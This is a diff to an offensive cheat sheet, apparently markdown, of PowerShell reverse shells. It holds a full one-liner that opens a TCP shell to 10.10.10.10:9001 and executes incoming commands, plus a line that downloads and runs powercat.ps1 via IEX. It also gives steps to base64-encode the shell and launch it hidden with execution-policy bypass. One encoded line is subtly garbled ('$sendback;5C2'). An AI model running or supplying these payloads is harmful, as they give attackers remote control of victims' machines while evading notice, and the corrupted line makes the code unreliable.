@@ -74,10 +74,10 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');
 ```powershell
 # Normal:
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
-# Encoded:
+# Encoded (base64):
 echo -n "\$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback;5C2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};" > rev.txt
-iconv -f ASCII -t UTF-16LE shell.txt | base64 | tr -d '\n'
-powershell -w hidden -exec bypass -nop -enc <BASE64>
+iconv -f ASCII -t UTF-16LE rev.txt | base64 -w 0
+powershell -w hidden -exec bypass -nop -enc <BASE64> # Only the -enc parameter is sufficient.
 ```
 
 ```powershell
